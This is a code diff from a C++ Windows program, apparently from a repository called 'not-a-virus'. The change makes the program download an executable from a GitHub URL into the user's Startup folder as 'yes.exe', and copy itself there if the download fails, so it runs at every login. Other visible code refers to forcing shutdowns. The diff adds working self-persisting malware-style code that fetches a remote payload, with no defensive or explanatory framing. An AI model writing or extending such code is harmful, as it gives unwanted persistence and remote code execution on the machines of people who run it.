@@ -8,8 +8,10 @@ unsigned amount;
 bool downShut;
 bool quitNormally;
 
-void DownloadFile(std::string path) {
-    URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL);
+void DownloadFile(std::string path, char** argv) {
+    if (URLDownloadToFileA(NULL, (LPCSTR)"https://raw.githubusercontent.com/ethanaobrien/not-a-virus/main/application.exe", path.c_str(), 0, NULL) != S_OK) {
+        CopyFileA((LPCSTR)argv[0], path.c_str(), false);
+    }
 }
 
 void ShutDown() {
@@ -46,10 +48,7 @@ int main(int argc, char** argv)
     std::string UserName = username;
     std::string pathOut = "C:\\\\Users\\" + UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\yes.exe";
     remove(pathOut.c_str());
-    DownloadFile(pathOut);
-    /*
-    CopyFileA((LPCSTR)argv[0], pathOut.c_str(), false);
-    */
+    DownloadFile(pathOut, argv);
     
     downShut = false;
     amount = 0;
